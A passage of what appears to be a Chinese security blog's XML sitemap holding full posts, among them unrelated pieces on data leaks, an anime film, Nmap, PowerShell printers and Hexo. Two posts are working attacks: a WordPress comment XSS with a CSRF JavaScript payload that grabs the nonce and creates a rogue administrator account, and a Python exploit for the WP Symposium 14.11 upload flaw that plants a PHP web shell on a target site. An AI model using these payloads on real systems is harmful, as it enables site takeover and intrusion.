              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/wordpress-xss-one.html</loc>
    <lastmod>2015-01-07T12:35:02.000Z</lastmod>
    <data>
        <display>
        <title>WordPress评论处XSS&CSRF</title>
        <pubTime>2015-01-07T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<p> 现在这个漏洞依然存在，我们来构造CSRF脚本，让管理员执行我们要执行的动作</p>
<p>首先我们打开前台评论输入：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie);<span class="xml"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span></div></pre></td></tr></table></figure>

<p>点击提交之后，弹窗cookie<br><img src="http://dn-wwweshell.qbox.me/wordpress-xss-11.png" alt="wordpress-xss"></p>
<p>当然这个XSS脚本提交之后是不会在后台执行的，但是始终存在，我们可以构造一个CSRF脚本来getshell，脚本具体怎么写，因人而异，下面是列子：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">pre</span> <span class="attribute">class</span>=<span class="value">"lang:xhtml decode:true "</span> &gt;</span>var request = false;</div><div class="line">if(window.XMLHttpRequest) {</div><div class="line">request = new XMLHttpRequest();</div><div class="line">if(request.overrideMimeType) {</div><div class="line">request.overrideMimeType('text/xml');</div><div class="line">}</div><div class="line">} else if(window.ActiveXObject) {</div><div class="line">var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];</div><div class="line">for(var i=0; i<span class="tag">&lt;<span class="title">versions.length;</span> <span class="attribute">i</span>++) {</span></div><div class="line"><span class="attribute">try</span> {</div><div class="line"><span class="attribute">request</span> = <span class="attribute">new</span> <span class="attribute">ActiveXObject</span>(<span class="attribute">versions</span>[<span class="attribute">i</span>]);</div><div class="line">} <span class="attribute">catch</span>(<span class="attribute">e</span>) {}</div><div class="line">}</div><div class="line">}</div><div class="line"><span class="attribute">var</span> <span class="attribute">src</span>=<span class="value">location.href.substring(0,location.href.lastIndexOf('</span>/'));</div><div class="line"><span class="attribute">xmlhttp</span>=<span class="value">request;</span></div><div class="line"><span class="attribute">POSTa</span>();</div><div class="line"><span class="attribute">function</span> <span class="attribute">POSTa</span>(){</div><div class="line"><span class="attribute">xmlhttp.open</span>("<span class="attribute">GET</span>", <span class="attribute">src</span>+"/<span class="attribute">wp-admin</span>/<span class="attribute">user-new.php</span>", <span class="attribute">false</span>);</div><div class="line"><span class="attribute">xmlhttp.send</span>(<span class="attribute">postStr</span>);</div><div class="line"><span class="attribute">var</span> <span class="attribute">respone</span> = <span class="attribute">xmlhttp.responseText</span>; </div><div class="line"><span class="attribute">var</span> <span class="attribute">arr</span>=<span class="value">respone.match(</span>/<span class="attribute">name</span>\<span class="attribute">s</span>*=<span class="value">\s*"_wpnonce_create-user"\s*value\s*=\s*"(.*?)"</span>/);</div><div class="line"><span class="attribute">var</span> <span class="attribute">hash</span>=<span class="value">arr[1];</span> </div><div class="line"><span class="attribute">var</span> <span class="attribute">postStr</span>=<span class="value">("action=createuser&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=admin&email=admin%40admin.com&first_name=&last_name=&url=&pass1=adminadmin%21%40%23%24&pass2=adminadmin%21%40%23%24&role=administrator&createuser=%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%94%A8%E6%88%B7&_wpnonce_create-user="+hash);</span></div><div class="line"><span class="attribute">xmlhttp.open</span>("<span class="attribute">POST</span>", <span class="attribute">src</span>+"/<span class="attribute">wp-admin</span>/<span class="attribute">user-new.php</span>", <span class="attribute">true</span>);</div><div class="line"><span class="attribute">xmlhttp.setRequestHeader</span>("<span class="attribute">Content-type</span>", "<span class="attribute">application</span>/<span class="attribute">x-www-form-urlencoded</span>");</div><div class="line"><span class="attribute">xmlhttp.setRequestHeader</span>("<span class="attribute">Referer</span>", <span class="attribute">src</span>+"/<span class="attribute">wp-admin</span>/<span class="attribute">user-new.php</span>");</div><div class="line"><span class="attribute">xmlhttp.setRequestHeader</span>("<span class="attribute">Content-length</span>", <span class="attribute">postStr.length</span>);</div><div class="line"><span class="attribute">xmlhttp.setRequestHeader</span>("<span class="attribute">Connection</span>", "<span class="attribute">close</span>");</div><div class="line"><span class="attribute">xmlhttp.send</span>(<span class="attribute">postStr</span>);</div><div class="line">}</div></pre></td></tr></table></figure>

<p>当被管理员触发后将会执行以下动作：<br><img src="http://dn-wwweshell.qbox.me/success.png(986×209).png" alt="csrf"></p>
]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/html5-android.html</loc>
    <lastmod>2015-01-07T11:53:14.000Z</lastmod>
    <data>
        <display>
        <title>HTML5游戏变身Android恶意软件</title>
        <pubTime>2015-01-07T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="HTML5Android恶意软件击方式">HTML5Android恶意软件击方式</h2>
<p>方法一.初始化本地网络视图<br>这是一种非常受黑客欢迎的攻击方式，使用它并不用改变HTML5应用的代码。黑客只需要初始化一个本地网络视图，加载本地或远程的HTML5/JavaScript/CSS代码即可。这样主程序仍能运行，而产生的却是新的安卓应用。<br>然而，大多数黑客并不会在这里止步，因为只把web应用转为安卓应用是完全没有意义的。黑客在大多数时候会在发布应用之前，就将恶意代码注入其中。<br><img src="http://dn-wwweshell.qbox.me/14205949756209.png" alt="html5"></p>
<p>方法二.将HTML5应用打包通过中间键注入JS恶意代码<br>随着安卓越来越受大众的欢迎，许多中间件由此诞生，方便人们开发跨平台的应用。中间件是一种第三方软件/框架，在应用和操作系统之间作桥梁之用。<br>对于HTML5与相关web应用，现今有几种开源框架支持跨平台开发，比如：Phonegap, Apache Cordova, Crosswalk, Cocoonjs等等，而且这些中间件通常都支持HTML5，其中一个典型例子就是Apache Cordova。<br>除了使用网络视图的HTML5/JavaScript/CSS代码外，适用于那些中间件的应用通常都基于那些框架核心库运行，就如那些定制的浏览器一样。由于那些中间件强大的API给开发者提供了许多便捷，他们只需要使用JS代码就能与安卓进行交互。换句话说，如果HTML5应用利用了中间件的特性，可以轻松进行恶意代码注入和执行。<br><img src="http://dn-wwweshell.qbox.me/14205949462520.png" alt="html5恶意代码"></p>
<h2 id="科普">科普</h2>
<p>WebView(网络视图)：能加载显示网页，可以将其视为一个浏览器，它使用了WebKit渲染引擎加载显示网页。<br>SDK（Software Development Kit）：一般都是一些被软件工程师用于为特定的软件包、软件框架、硬件平台、操作系统等建立应用软件的开发工具的集合。<br>HTML5使得开发更强大的web应用变得更加简单，因其开发的web应用的平台低依赖性，一定程度上在安卓平台上有着较大优势。对于开发者来说，跨平台开发的难度降低，可以说是一次开发多方通用（WORA）并不会在跨平台上耗费精力。对于用户来说，他们可以在不同的移动平台分享喜爱的应用。这些意味着使用HTML5进行web应用开发，对于诸方都是有利的。<br>当然，跨平台也会带来隐患比如跨平台注入，JS代码保护的机制太少，导致web应用可以被轻松复制和重新打包。理论上来讲，通过代码注入和重新打包，黑客可以剽窃任何他们想要的HTML5的跨平台web应用。</p>
<h2 id="结尾">结尾</h2>
<p>在未来，我们可以预见到这种由HTML5开发的恶意软件可以通杀不同的移动平台（比如IOS，安卓，WinPhone）。为了避免这种情况，开发者应多花点精力在代码混淆和使用其他编码技巧，这样在一定程度上可以保护他们的应用程序。家庭用户需要使用新的应用程序时，最好去官方应用商店下载。</p>
]]></content>
         
         
           
             
              <breadCrumb title="网络安全" url="http://www.weshell.net/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
          
        </display>
    </data>
    </url>

    
    
  <url>
    <loc>http://www.weshell.net/date-for-people.html</loc>
    <lastmod>2015-01-05T16:31:12.000Z</lastmod>
    <data>
        <display>
        <title>大数据之下的隐私无处可藏</title>
        <pubTime>2015-01-01T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="前提概要">前提概要</h2>
<p>  2014年注定了在网络安全界是不可磨灭的一年，从支付宝、苹果、携程、微软、索尼和小米再到现在的12306，还有其他未被公布的泄漏数据，<br>这一年爆发了太多的网络安全届的大事件，Angel没有办法去一一述说……如果整合这些数据，写出一个超级数据库供黑客查询，这将导致的后果无法想象。</p>
<h2 id="无法逆转的泄漏洪潮">无法逆转的泄漏洪潮</h2>
<p>  世界上的任何系统都没有绝对的安全，在Angel看来出问题的不在于系统，而是在于操作这些系统的人，这恰恰是被忽略的环节，</p>
<p>回顾CSDN泄漏事件，它的数据之所以被泄漏正是因为个别人利益熏心，坚守自盗。一个羊圈你建的再高再厚，你只能防住外面的狼,你防不住帮你养羊的人。如果那些羊圈的主人告诉养羊人晚上你将羊关好后，把钥匙交给保管员，早上放羊的时候再去领钥匙，那么羊也就不会丢了，当然这个比喻不算恰当，这里只是想告诉那些养羊人一定要有一个正确的权限策略，这个权限策略关系到你整个公司的命脉与我们广大网友的隐私。</p>
<p>  在数据泄漏的洪潮中，我们网民能做的只能是祈祷、观望，因为不管我们将密码设置的如何强壮，都会被人从数据库中盗走，值得欣慰的是大部分公司都不会在以明文保存了，我之所以要说前面一句话是想以此为引子来批判12306，作为一个国营企业，一个强大的商业帝国，却将他客户的隐私视为鸿毛，曾经有“幸拜”读了一篇关于12306网站架构的文章，在文章中12306的数据库被誉为世界上最“顶尖”的数据库，其中复杂的算法，复杂的索引，牛B的负载均衡，牛B的集群，牛B的一切完全由12306旗下子公司独自一家研发，投资上亿，最后展现在我们面前的却是这样一个网站.</p>
<p>当初招标的时候很多有实力的公司都参与了投标，最后竟然被他子公司中标，肥水不流外人田这是中国传统，我懂！但是你们至少拿出一个像样的项目出来，就拿出来这样一个shit！当数据被泄漏时操纵媒体报道说是黑客通过撞裤手段获得的数据库，呵呵明显的混淆视听，明眼的人都能看出来这分明就是被拖裤，我没有见过有人通过撞裤的手段获得千万条数据，以后将来也都不会有。到底是内鬼还是漏洞其中缘由各位看官自行体会。最后忠告12306不要老是依赖执法部门，请站在客观立场来审视自身原因才是正途（或许有的看官老爷不懂什么是拖裤和撞裤，可以百度一下）</p>
<h2 id="大数据的整合等于灾难">大数据的整合等于灾难</h2>
<p>  Angel在前提提要中讲到如果这些数据被有心人收集到，然后打造出T级别的信息查询系统，那么你我的隐私将被彻底暴漏无疑，这种灾难无人可以承受。Angel自己也搭建了一个G级别的查询系统，因为涉及到法律方面所以没有公开，就是在我这个G级别的查询系统中都查出了我众多的资料，包括电话、身份证、地址、常用密码邮箱。想象一下一个T级别的可以查处多少我的信息，当然我作为一个网络安全从业人员自然会去作相应的对策，但是涉及到的千万网友中，只有一小部分才有Angel的安全意识，剩下的都几乎裸奔在互联网上，想象一下如果这些人拿到这些数据去试图登录你的支付宝，邮箱等等，这将会给你带来多大的损失？这里Angel再次严重警告大家经常修改密码不是口头残，你一定要这么做，而且你必须做，千万不要试图将密码修改为你曾经用过的密码或者用过密码的组合，一定要设置全新的密码。这里要赞一下apple的密码修改策略，希望各大厂商都能学习模仿，要知道模仿并不可耻，客户才是你的命脉！</p>
<h2 id="往期泄漏事件图片回顾">往期泄漏事件图片回顾</h2>
<p>12306：</p>
<p><img src="http://dn-wwweshell.qbox.me/12306.png" alt="12306数据泄漏"></p>
<p>天涯：</p>
<p><img src="http://dn-wwweshell.qbox.me/tianya.png" alt="天涯数据泄漏"></p>
<p>QQ：</p>
<p><img src="http://dn-wwweshell.qbox.me/qqxilou.png" alt="QQ数据泄漏"></p>
<p>CSDN：</p>
<p><img src="http://dn-wwweshell.qbox.me/csdn.png" alt="csdn数据泄漏"></p>
]]></content>
         
         
           
             
              <breadCrumb title="网络安全" url="http://www.weshell.net/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/kuiba.html</loc>
    <lastmod>2015-01-05T14:54:04.000Z</lastmod>
    <data>
        <display>
        <title>《魁拔》不愧为国产巨作</title>
        <pubTime>2015-01-05T14:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="魁拔语句">魁拔语句</h2>
<p>我的小鱼你醒了，<br>还认识早晨吗？<br>昨夜你曾经说，<br>愿夜幕永不开启。<br>你的香腮边轻轻滑落的，<br>是你的泪，还是我的泪？<br>初吻吻别的那个季节，<br>不是已经哭过了吗？<br>我的指尖还记忆着，<br>你慌乱的心跳。<br>温柔的体香里，<br>那一缕长发飘飘。</p>
<h2 id="正文">正文</h2>
<p>  今天在老家的贴吧里无意间看到了关于魁拔的讨论，无一差评，倍感自豪，because魁拔里的一个角色原型是我嫂子制作的，作为她弟弟的我<br>也提供了不少意见。而且【我的指尖还记忆着，你慌乱的心跳，温柔的体香里，那一缕长发飘飘】这句是由我女朋友提交到魁拔制作组的，可以<br>说魁拔与我有各种千丝万缕的关系，看到它能赢得众多好评心里也是极舒坦的，作为一部动画片能收到这么高的票房，是制作组没有想到的<br>，也是众多动漫爱好者始料未及的，其中七分之六的票房是由成人贡献的，18岁一下的不到七分之一。成人我们都知道，心理、生理都已成熟<br>自然对动画片不屑一顾，它的精彩可见一斑。可以说魁拔所到达的高度是国产动画片前所未有的。</p>
<h2 id="结尾语">结尾语</h2>
<p>  这里强烈推荐大家看一看，这部片子使用的是全新的风格，侠义、江湖、儿女柔情贯穿主体，实在是不可多得好片，就连《秦时明月》也不得低<br>一头，反正Angel在看这部片子的时候心里五味杂陈，有感动，有心酸，有热血……不再多说，其中滋味自行体会。。</p>
]]></content>
         
         
           
             
              <breadCrumb title="生活琐事" url="http://www.weshell.net/categories/%E7%94%9F%E6%B4%BB%E7%90%90%E4%BA%8B/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/wordpress-symposium.html</loc>
    <lastmod>2015-01-05T13:40:34.000Z</lastmod>
    <data>
        <display>
        <title>WordPress WP Symposium14.11插件上传漏洞</title>
        <pubTime>2015-01-05T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：WordPress-Symposium14.11插件上传漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：14.11</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h2 id="漏洞产生原因">漏洞产生原因</h2>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">"/wp-symposium/server/file_upload_form.php " </div><div class="line"></div><div class="line">if ($_FILES["file"]["error"] &gt; 0) {</div><div class="line">       echo "Error: " . $_FILES["file"]["error"] . "<span class="tag">&lt;<span class="title">br</span>&gt;</span>";</div><div class="line">   } else {</div><div class="line">       $allowedExts = ','.get_option(WPS_OPTIONS_PREFIX.'_image_ext').','.get_option(WPS_OPTIONS_PREFIX.'_doc_ext').','.get_option(WPS_OPTIONS_PREFIX.'_video_ext');</div><div class="line">       //echo "Upload: " . $_FILES["file"]["name"] . "<span class="tag">&lt;<span class="title">br</span>&gt;</span>";</div><div class="line">       $ext = pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION);</div><div class="line">       //echo "Extension: " . $ext . "<span class="tag">&lt;<span class="title">br</span> /&gt;</span>";</div><div class="line">       if (strpos($allowedExts, $ext)) {</div><div class="line">       $extAllowed = true;</div><div class="line">       } else {</div><div class="line">           $extAllowed = false;</div><div class="line">       }</div><div class="line">       //echo "Type: " . $_FILES["file"]["type"] . "<span class="tag">&lt;<span class="title">br</span>&gt;</span>";</div><div class="line">       //echo "Size: " . ($_FILES["file"]["size"] / 1024) . " kB<span class="tag">&lt;<span class="title">br</span>&gt;</span>";</div><div class="line">       //echo "Stored in: " . $_FILES["file"]["tmp_name"];</div><div class="line"></div><div class="line">       if (!$extAllowed) {</div><div class="line">           echo __('Sorry, file type not allowed.', WPS_TEXT_DOMAIN);</div><div class="line">       } else {</div><div class="line">           // Copy file to tmp location</div></pre></td></tr></table></figure>

<p><br></p>
<h2 id="利用代码python">利用代码python</h2>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div></pre></td><td class="code"><pre><div class="line"># Check url</div><div class="line">def checkurl(url):</div><div class="line">    if url[:8] != "https://" and url[:7] != "http://":</div><div class="line">        print('[X] You must insert http:// or https:// procotol')</div><div class="line">        sys.exit(1)</div><div class="line">    else:</div><div class="line">        return url</div><div class="line"></div><div class="line"># Check if file exists and has readable</div><div class="line">def checkfile(file):</div><div class="line">    if not os.path.isfile(file) and not os.access(file, os.R_OK):</div><div class="line">        print '[X] '+file+' file is missing or not readable'</div><div class="line">        sys.exit(1)</div><div class="line">    else:</div><div class="line">        return file</div><div class="line"># Get file's mimetype</div><div class="line">def get_content_type(filename):</div><div class="line">    return mimetypes.guess_type(filename)[0] or 'application/octet-stream'</div><div class="line"></div><div class="line">def id_generator(size=6, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):</div><div class="line">    return ''.join(random.choice(chars) for _ in range(size))</div><div class="line"></div><div class="line"># Create multipart header</div><div class="line">def create_body_sh3ll_upl04d(payloadname, randDirName, randShellName):</div><div class="line"></div><div class="line">   getfields = dict()</div><div class="line">   getfields['uploader_uid'] = '1'</div><div class="line">   getfields['uploader_dir'] = './'+randDirName</div><div class="line">   getfields['uploader_url'] = url_symposium_upload</div><div class="line"></div><div class="line">   payloadcontent = open(payloadname).read()</div><div class="line"></div><div class="line">   LIMIT = '----------lImIt_of_THE_fIle_eW_$'</div><div class="line">   CRLF = '\r\n'</div><div class="line"></div><div class="line">   L = []</div><div class="line">   for (key, value) in getfields.items():</div><div class="line">      L.append('--' + LIMIT)</div><div class="line">      L.append('Content-Disposition: form-data; name="%s"' % key)</div><div class="line">      L.append('')</div><div class="line">      L.append(value)</div><div class="line"></div><div class="line">   L.append('--' + LIMIT)</div><div class="line">   L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', randShellName+".php"))</div><div class="line">   L.append('Content-Type: %s' % get_content_type(payloadname))</div><div class="line">   L.append('')</div><div class="line">   L.append(payloadcontent)</div><div class="line">   L.append('--' + LIMIT + '--')</div><div class="line">   L.append('')</div><div class="line">   body = CRLF.join(L)</div><div class="line">   return body</div><div class="line"></div><div class="line">commandList = optparse.OptionParser('usage: %prog -t URL -f FILENAME.PHP [--timeout sec]')</div><div class="line">commandList.add_option('-t', '--target', action="store",</div><div class="line">                  help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",</div><div class="line">                  )</div><div class="line">commandList.add_option('-f', '--file', action="store",</div><div class="line">                  help="Insert file name, ex: shell.php",</div><div class="line">                  )</div><div class="line">commandList.add_option('--timeout', action="store", default=10, type="int",</div><div class="line">                  help="[Timeout Value] - Default 10",</div><div class="line">                  )</div><div class="line"></div><div class="line">options, remainder = commandList.parse_args()</div><div class="line"></div><div class="line"># Check args</div><div class="line">if not options.target or not options.file:</div><div class="line">    print(banner)</div><div class="line">    commandList.print_help()</div><div class="line">    sys.exit(1)</div><div class="line"></div><div class="line">payloadname = checkfile(options.file)</div><div class="line">host = checkurl(options.target)</div><div class="line">timeout = options.timeout</div><div class="line"></div><div class="line">print(banner)</div><div class="line"></div><div class="line">socket.setdefaulttimeout(timeout)</div><div class="line"></div><div class="line">url_symposium_upload = host+'/wp-content/plugins/wp-symposium/server/php/'</div><div class="line"></div><div class="line">content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'</div><div class="line"></div><div class="line">randDirName = id_generator()</div><div class="line">randShellName = id_generator()</div><div class="line"></div><div class="line">bodyupload = create_body_sh3ll_upl04d(payloadname, randDirName, randShellName)</div><div class="line"></div><div class="line">headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',</div><div class="line">           'content-type': content_type,</div><div class="line">           'content-length': str(len(bodyupload)) }</div><div class="line"></div><div class="line">try:</div><div class="line">    req = urllib2.Request(url_symposium_upload+'index.php', bodyupload, headers)</div><div class="line">    response = urllib2.urlopen(req)</div><div class="line">    read = response.read()</div><div class="line"></div><div class="line">    if "error" in read or read == "0" or read == "":</div><div class="line">       print("[X] Upload Failed :(")</div><div class="line">    else:</div><div class="line">       print("[!] Shell Uploaded")</div><div class="line">       print("[!] Location: "+url_symposium_upload+randDirName+randShellName+".php\n")</div><div class="line"></div><div class="line">except urllib2.HTTPError as e:</div><div class="line">    print("[X] "+str(e))</div><div class="line">except urllib2.URLError as e:</div><div class="line">    print("[X] Connection Error: "+str(e))</div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/npm6.4.0.html</loc>
    <lastmod>2015-01-05T13:25:56.000Z</lastmod>
    <data>
        <display>
        <title>Nmap 6.40发布!全新架构,更好的性能!</title>
        <pubTime>2015-01-05T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="支持">支持</h2>
<p>Nmap 6.40支持Linux,Windows和Mac<br>下载地址：”<a href="http://nmap.org/download.html" target="_blank" rel="external">http://nmap.org/download.html</a>“ 如果你发现有bug可以再这里给我们回馈”<a href="http://nmap.org/book/man-bugs.html" target="_blank" rel="external">http://nmap.org/book/man-bugs.html</a>“</p>
<h2 id="特性">特性</h2>
<p>o(Ncat)- i选项(闲置超时)现在以监听模式以及工作<br>连接模式。</p>
<p>o(Ncat)——ssl-cert Ncat现在支持链证书<br>选择。</p>
<p>o(Ncat)修复固定连接到IPv6代理中的错误</p>
<p>o(Ncat)重写telnet-brute以便获得更好的兼容性</p>
<p>o(Ncat)优化解析输出XML时间</p>
]]></content>
         
         
           
             
              <breadCrumb title="神兵利器" url="http://www.weshell.net/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/PowerShell-Install.html</loc>
    <lastmod>2015-01-05T12:58:20.000Z</lastmod>
    <data>
        <display>
        <title>使用PowerShell安装网络打印机</title>
        <pubTime>2015-01-05T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<p>如何使用Windows PowerShell安装网络打印机？<br>安装新的网络打印机需要使用Windows PowerShell执行以下步骤:<br>1.安装打印机驱动程序<br>2.创建一个标准的TCP/IP端口的打印机<br>3.安装打印机使用指定的端口<br>4.执行任何额外的配置所需的打印机</p>
<p>例如,假设你想要安装戴尔的彩色激光PCL6类驱动打印服务器。 你可以安装Add-PrinterDriver mdlet驱动程序:</p>
<p>PS C:> Add-PrinterDriver -ComputerName HOST7 -Name “Dell Color Laser PCL6 Class Driver”</p>
<p>接下来添加打印机端口:<br>PS C:> Add-PrinterPort -ComputerName HOST7 -Name “172.16.11.63”<br>-PrinterHostAddress“172.16.11.63”</p>
<p>接下来,给add-Printer cmdlet建立一个名称，把他应用到指定端口:<br>PS C:> Add-Printer -ComputerName HOST7 -Name “Sales Printer” <code>-DriverName &quot;Dell Color Laser PCL6 Class Driver&quot; -Shared</code><br>-ShareName “SalesPrint” -PortName “172.16.11.63”</p>
<p>最后你可以更改纸张大小<br>PS C:> Set-PrintConfiguration -ComputerName HOST7 -PrinterName “Sales Printer”</p>
<p>找的国外的一篇教程随便翻译一下，以备自用。</p>
]]></content>
         
         
           
             
              <breadCrumb title="生活琐事" url="http://www.weshell.net/categories/%E7%94%9F%E6%B4%BB%E7%90%90%E4%BA%8B/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/hexo-keywords.html</loc>
    <lastmod>2015-01-04T12:15:10.000Z</lastmod>
    <data>
        <display>
        <title>hexo优化之添加关键字</title>
        <pubTime>2015-01-04T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="啰嗦几句">啰嗦几句</h2>
<p>  不得不赞美hexo的强大，你甚至能把它全部代码都部署在七牛和又拍云以及类似的平台，唉！没有早点遇上它，可惜了。。<br>能看到这篇文章的基本都是懒人，像我一样。我是因为自己没有找到相关的教程，才硬着头皮去看了两下官方文档，好家伙，<br>全英文，于是CTRL+F搜索keywords，折腾半天，又是翻译又是测试的，要怪就怪我英语是语文老师教的。各位大牛勿见笑，毕竟<br>我是新人。我相信用hexo的都是逼格极高的程序员… …你们不会笑的</p>
<h2 id="添加关键词">添加关键词</h2>
<p>  作为强迫症，我必须要求我的博客和别人的博客一模一样，标题、描述、关键词、作者一个都不能少，但是尼玛hexo非要跟我过不<br>去，什么都有了，就是keywords没有（这么说也不对，毕竟是隐藏属性）。官方文档上说description和keywords这俩玩意儿自带的<br>有，不用再去XXX，直接调用就OK了，果断测试了一下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">title: 安全天使angel的测试</div><div class="line">description: 这是描述</div><div class="line">keywords: 这是关键字</div><div class="line">------------------------</div><div class="line">返回结果：</div><div class="line"><span class="tag">&lt;<span class="title">title</span>&gt;</span>安全天使angel的测试<span class="tag">&lt;/<span class="title">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"description"</span> <span class="attribute">content</span>=<span class="value">"这是描述"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"keywords"</span> <span class="attribute">content</span>=<span class="value">"未指定"</span>&gt;</span></div><div class="line"></div><div class="line">我XX，显示尼玛未指定，定睛一看麻蛋，忘记调用了</div><div class="line">打开themes/主题/layout/_partial/head.ejs 找到输出keywords的语句，替换为：</div><div class="line">  <span class="vbscript">&lt;% <span class="keyword">if</span> (page.keywords){ %&gt;</span>  //如果是文章页则输出文章页指定的关键词</div><div class="line">  <span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"keywords"</span> <span class="attribute">content</span>=<span class="value">"&lt;%= page.keywords %&gt;"</span>&gt;</span></div><div class="line"><span class="vbscript">&lt;% } <span class="keyword">else</span> <span class="keyword">if</span> (config.keywords){ 